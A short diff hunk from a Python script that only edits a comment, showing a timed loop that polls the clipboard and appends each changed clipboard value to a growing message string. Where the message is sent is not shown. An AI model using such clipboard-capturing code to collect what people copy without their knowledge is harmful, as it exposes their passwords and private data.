@@ -67,7 +67,7 @@ def main():
     start = time.time()
     while time.time() - start < ttl:
         currentData = clipboardCopy(currentData)
-        if currentData != lastData: #add currentData to message if it has changed
+        if currentData != lastData: #add currentData to message if changed
             message =  message + "\n*****\n" + currentData 
             
         time_dif = round((time.time() - start))  
